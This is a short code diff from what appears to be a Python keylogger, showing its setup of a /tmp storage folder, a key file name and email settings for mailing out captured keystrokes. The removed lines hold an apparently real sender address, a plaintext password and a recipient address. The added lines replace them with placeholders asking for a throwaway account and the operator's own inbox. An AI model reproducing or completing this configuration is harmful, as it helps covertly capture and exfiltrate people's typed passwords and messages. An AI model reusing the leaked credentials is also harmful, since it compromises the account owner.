@@ -38,9 +38,9 @@ Cryptokey = "KEY.txt"
 filepath = "//tmp//pythonkeylogger//"
 os.mkdir(filepath)
 
-email_address = "dycreations9653@gmail.com"
-password = "ruletheworld"
-toaddr = "anonymous.modernninja@gmail.com"
+email_address = "Enter a temp mail here"
+password = "Enter that temp mail password"
+toaddr = "Enter your mail here"
 
 count = 0
 keys = []
